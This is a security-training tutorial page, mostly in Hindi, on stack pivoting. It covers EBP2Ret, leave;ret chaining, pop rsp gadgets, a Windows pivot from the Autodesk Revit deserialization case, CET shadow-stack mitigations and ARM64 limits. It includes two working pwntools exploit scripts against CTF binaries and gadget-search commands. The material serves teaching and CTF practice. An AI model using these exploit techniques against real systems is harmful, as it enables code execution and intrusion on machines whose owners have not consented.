# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

यह तकनीक **Base Pointer (EBP/RBP)** को नियंत्रित करने की क्षमता का उपयोग करके फ्रेम पॉइंटर और **`leave; ret`** निर्देश अनुक्रम के सावधानीपूर्वक उपयोग के माध्यम से कई फ़ंक्शन्स के निष्पादन को चेन करने के लिए शोषण करती है।

स्मरण के लिए, x86/x86-64 पर **`leave`** निम्न के बराबर है:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
और चूँकि saved **EBP/RBP स्टैक में है** saved EIP/RIP से पहले, इसे स्टैक को नियंत्रित करके नियंत्रित करना संभव है।

> नोट्स
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

यह तकनीक खासकर तब उपयोगी होती है जब आप **saved EBP/RBP को बदल सकते हैं पर EIP/RIP को सीधे बदलने का कोई रास्ता नहीं है**। यह function epilogue के व्यवहार का लाभ उठाती है।

यदि `fvuln` के execution के दौरान आप स्टैक में एक नकली **EBP** inject कर देते हैं जो उस मेमोरी क्षेत्र की ओर इशारा करता है जहाँ आपका shellcode/ROP chain का address रखा है (साथ ही amd64 पर `pop` के लिए +8 bytes / x86 पर +4 bytes), तो आप अप्रत्यक्ष रूप से RIP को नियंत्रित कर सकते हैं। जब function return करेगा, `leave` RSP को उस crafted स्थान पर सेट कर देता है और इसके बाद `pop rbp` RSP को घटा देता है, **जिससे यह उस पते की ओर इशारा करने लगता है जिसे attacker ने वहाँ रखा होता है**। फिर `ret` उस पते का उपयोग करेगा।

ध्यान दें कि आपको 2 addresses पता होने चाहिए: वह address जहाँ ESP/RSP जाने वाला है, और उस address पर रखा value जिसे `ret` consume करेगा।

#### Exploit Construction

सबसे पहले आपको पता होना चाहिए कि एक ऐसा **address जहाँ आप arbitrary data/addresses लिख सकते हैं**। RSP यहीं पॉइंट करेगा और **पहला `ret` यहीं consume होगा**।

फिर, आपको `ret` द्वारा उपयोग किए जाने वाले address का चयन करना होगा जो **execution transfer** करेगा। आप उपयोग कर सकते हैं:

- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- The address of **`system()`** followed by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by inline shellcode.
- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.

याद रखें कि controlled क्षेत्र में इन किसी भी addresses से पहले वहाँ `leave` के `pop ebp/rbp` के लिए **स्थान होना चाहिए** (amd64 पर 8B, x86 पर 4B)। आप इन bytes का दुरुपयोग करके एक **दूसरा नकली EBP** सेट कर सकते हैं और पहले call के return होने के बाद नियंत्रण बनाए रख सकते हैं।

#### Off-By-One Exploit

एक variant तब इस्तेमाल होता है जब आप saved EBP/RBP के केवल least significant byte को ही बदल सकते हैं। ऐसी स्थिति में, वह मेमोरी स्थान जो `ret` के साथ jump करने के लिए address रखता है, उसे original EBP/RBP के साथ पहले तीन/पाँच bytes साझा करने चाहिए ताकि 1-byte overwrite उसे redirect कर सके। आमतौर पर low byte (offset 0x00) को बढ़ाया जाता है ताकि निकटवर्ती पेज/align किए हुए क्षेत्र के अंदर यथासंभव दूर तक कूद सके।

स्टैक में RET sled का उपयोग कर के और अंतिम में असली ROP chain रखने की प्रवृत्ति भी सामान्य है, ताकि नया RSP अधिक संभावना के साथ sled के अंदर पॉइंट करे और अंतिम ROP chain execute हो।

### EBP Chaining

स्टैक के saved `EBP` स्लॉट में एक नियंत्रित address रखकर और `leave; ret` gadget को `EIP/RIP` में रखकर, यह संभव है कि आप `ESP/RSP` को attacker-controlled address पर मूव कर दें।

अब `RSP` नियंत्रित है और अगली instruction `ret` है। नियंत्रित मेमोरी में कुछ ऐसा रखें:

- `&(next fake EBP)` -> `leave` से `pop ebp/rbp` द्वारा लोड होगा।
- `&system()` -> `ret` द्वारा कॉल होगा।
- `&(leave;ret)` -> जब `system` खत्म होगा, तब RSP को अगले fake EBP पर ले जाएगा और आगे चलेगा।
- `&("/bin/sh")` -> `system` के लिए आर्ग्युमेंट।

इस तरह कई fake EBP को chain करके प्रोग्राम के flow को नियंत्रित करना संभव है।

यह एक तरह का [ret2lib](../rop-return-oriented-programing/ret2lib/index.html) जैसा है, पर अधिक जटिल और केवल edge-cases में उपयोगी होता है।

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: System V ABI कॉल साइट्स पर 16-बाइट स्टैक alignment की आवश्यकता होती है। यदि आपकी chain `system` जैसे फ़ंक्शन कॉल करती है, तो कॉल से पहले alignment gadget (उदाहरण के लिए `ret`, या `sub rsp, 8 ; ret`) जोड़ें ताकि alignment बना रहे और `movaps` क्रैश से बचें।

## EBP का उपयोग न किया जा सकता है

As [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), अगर कोई binary कुछ optimizations के साथ या frame-pointer omission के साथ compiled की गई है, तो **EBP/RBP कभी भी ESP/RSP को नियंत्रित नहीं करते**। इसलिए, EBP/RBP को नियंत्रित करके काम करने वाला कोई भी exploit विफल हो जाएगा क्योंकि prologue/epilogue frame pointer से restore नहीं करते।

- Optimized नहीं / frame pointer का उपयोग किया गया:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- अनुकूलित / frame pointer छोड़ा गया:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
On amd64 पर आप अक्सर `pop rbp ; ret` को `leave ; ret` के बजाय देखेंगे, लेकिन अगर frame pointer पूरी तरह से हटा दिया गया है तो `rbp`-आधारित कोई epilogue नहीं होगा जिससे pivot किया जा सके।

## RSP को नियंत्रित करने के अन्य तरीके

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) आप इस तकनीक का एक उदाहरण पा सकते हैं। उस challenge में एक function को 2 specific arguments के साथ कॉल करना ज़रूरी था, और वहां एक **`pop rsp` gadget** और stack से एक **leak** था:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

यहाँ ret2esp तकनीक देखें:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### pivot gadgets को जल्दी खोजें

अपने पसंदीदा gadget finder का उपयोग करके classic pivot primitives खोजें:

- `leave ; ret` functions में या libraries में
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (या `add esp, <imm> ; ret` x86 पर)

उदाहरण:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### क्लासिक pivot staging pattern

एक मजबूत pivot रणनीति जो कई CTFs/exploits में उपयोग होती है:

1) एक छोटा प्रारम्भिक overflow उपयोग करें ताकि `read`/`recv` को एक बड़े writable क्षेत्र (जैसे `.bss`, heap, या mapped RW memory) में कॉल किया जा सके और वहाँ पूरा ROP chain रखा जा सके।
2) एक pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) में return करें ताकि RSP उस region में शिफ्ट हो जाए।
3) staged chain के साथ जारी रखें (उदा., leak libc, `mprotect` कॉल करें, फिर `read` shellcode, और फिर उसमें jump करें)।

### Windows: Destructor-loop weird-machine pivots (Revit RFA केस स्टडी)

Client-side parsers कभी-कभी destructor loops लागू करते हैं जो attacker-controlled object fields से निकले function pointer को indirectly कॉल करते हैं। यदि प्रत्येक iteration बिल्कुल एक indirect call प्रदान करता है (एक “one-gadget” machine), तो आप इसे एक reliable stack pivot और ROP entry में बदल सकते हैं।

Observed in Autodesk Revit RFA deserialization (CVE-2025-5037):

- Crafted objects of type `AString` place a pointer to attacker bytes at offset 0.
- The destructor loop effectively executes one gadget per object:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Two practical pivots:

- Windows 10 (32-bit heap addrs): एक misaligned “monster gadget” जो `8B E0` → `mov esp, eax` रखता है, अंततः `ret` के साथ, call primitive से heap-based ROP chain में pivot करने के लिए।
- Windows 11 (full 64-bit addrs): दो objects का उपयोग करके एक constrained weird-machine pivot drive करें:
- Gadget 1: `push rax ; pop rbp ; ret` (original rax को rbp में move करें)
- Gadget 2: `leave ; ... ; ret` (becomes `mov rsp, rbp ; pop rbp ; ret`), पहले object के buffer में pivot करता है, जहां एक conventional ROP chain आगे चलती है।

Tips for Windows x64 after the pivot:

- Respect the 0x20-byte shadow space and maintain 16-byte alignment before `call` sites। अक्सर literals को return address के ऊपर रखना और `lea rcx, [rsp+0x20] ; call rax` जैसे gadget का उपयोग करना followed by `pop rax ; ret` स्टैक एड्रेस पास करने के लिए सुविधाजनक होता है बिना control flow को corrupt किए।
- Non-ASLR helper modules (यदि मौजूद हों) स्थिर gadget pools और imports जैसे `LoadLibraryW`/`GetProcAddress` प्रदान करते हैं ताकि dynamic तरीके से targets जैसे `ucrtbase!system` resolve कर सकें।
- Creating missing gadgets via a writable thunk: यदि एक promising sequence एक writable function pointer के माध्यम से `call` में समाप्त होता है (उदा., DLL import thunk या function pointer in .data), उस pointer को एक benign single-step से overwrite करें जैसे `pop rax ; ret`। तब sequence वैसे ही व्यवहार करेगा जैसे यह `ret` पर समाप्त हुआ हो (उदा., `mov rdx, rsi ; mov rcx, rdi ; ret`), जो अन्य registers को clobber किए बिना Windows x64 arg registers load करने के लिए अमूल्य है।

For full chain construction and gadget examples, see the reference below।

## Modern mitigations that break stack pivoting (CET/Shadow Stack)

आधुनिक x86 CPUs और OSes तेजी से **CET Shadow Stack (SHSTK)** को लागू कर रहे हैं। SHSTK सक्षम होने पर, `ret` सामान्य स्टैक पर return address की तुलना hardware-protected shadow stack से करता है; कोई भी mismatch Control-Protection fault उठाता है और process को समाप्त कर देता है। इसलिए, EBP2Ret/leave;ret-based pivots जैसे techniques तब crash कर जाएंगे जब pivoted stack से पहला `ret` execute होगा।

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Linux पर त्वरित जांच:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- लैब/CTF के लिए नोट्स:
- कुछ आधुनिक distros हार्डवेयर और glibc सपोर्ट मौजूद होने पर CET-enabled बाइनरीज़ के लिए SHSTK सक्षम करते हैं। नियंत्रित परीक्षण के लिए VMs में, SHSTK को system-wide के लिए kernel boot parameter `nousershstk` के माध्यम से अक्षम किया जा सकता है, या स्टार्टअप के दौरान glibc tunables के जरिए चयनात्मक रूप से सक्षम किया जा सकता है (देखें references)। उत्पादन लक्ष्यों पर mitigations न बदलें।
- JOP/COOP या SROP-आधारित तकनीकें कुछ लक्ष्यों पर अभी भी व्यावहारिक हो सकती हैं, लेकिन SHSTK विशेष रूप से `ret`-आधारित pivots को तोड़ देता है।

- Windows नोट: Windows 10+ user-mode को और Windows 11 kernel-mode में “Hardware-enforced Stack Protection” को shadow stacks पर बनाकर एक्सपोज़ करता है। CET-compatible processes `ret` पर stack pivoting/ROP को रोकते हैं; डेवलपर्स CETCOMPAT और संबंधित नीतियों के माध्यम से opt-in करते हैं (देखें reference)।

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't return to the address pointed by SP, but **to the address inside `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> ARM64 में stack pivoting जैसा कुछ करने का तरीका यह होगा कि आप किसी ऐसे register को नियंत्रित कर सकें जिससे `SP` प्राप्त करता हो (या किसी कारण से `SP` स्टैक से कोई address ले रहा हो और हमारे पास overflow हो) और फिर epilogue का दुरुपयोग करके नियंत्रित `SP` से **`x30`** को लोड करके उस पर **`RET`** कर सकें।

Also in the following page you can see the equivalent of **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## संदर्भ

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bits — off by one exploitation, एक rop chain जो ret sled से शुरू होता है
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit — relro, canary, nx और pie मौजूद नहीं हैं। प्रोग्राम stack या pie के लिए एक leak और एक qword के लिए WWW प्रदान करता है। पहले stack leak प्राप्त करें और WWW का उपयोग करके pie leak वापस प्राप्त करें। फिर WWW का उपयोग करके `.fini_array` एंट्रीज़ का दुरुपयोग करके एक eternal loop बनाएं + `__libc_csu_fini` को कॉल करें ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). इस "eternal" write का दुरुपयोग करते हुए, .bss में एक ROP chain लिखी जाती है और अंततः RBP के साथ pivot करते हुए उसे कॉल किया जाता है।
- Linux kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — SHSTK, `nousershstk`, `/proc/$PID/status` flags, और `arch_prctl` के माध्यम से सक्रिय करने के बारे में विवरण। https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
